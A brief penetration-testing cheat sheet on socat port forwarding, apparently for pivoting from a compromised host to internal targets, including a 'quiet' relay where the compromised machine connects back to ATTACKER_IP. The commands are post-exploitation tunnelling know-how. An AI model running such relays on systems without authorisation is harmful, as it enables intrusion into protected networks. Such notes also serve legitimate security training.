# Socat

### Local Port forwarding

Connect to port \<compromised\_host\_port> on the compromised host and have our connection directly relayed to our intended target of :\<target\_ip>:\<target\_port>.

```bash
./socat tcp-l:<compromised_host_port>,fork,reuseaddr tcp:<target_ip>:<target_port> &
```

* `fork`: put every connection into a new process
* `reuseaddr`: the port stays open after a connection is made to it

### Quiet port forwarding

```bash
# creating a local port relay on the Attacker machine
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

# on the compromised machine
# create a relay server 
./socat tcp:ATTACKER_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

You can access the target server into localhost:ATTACKING\_PORT.
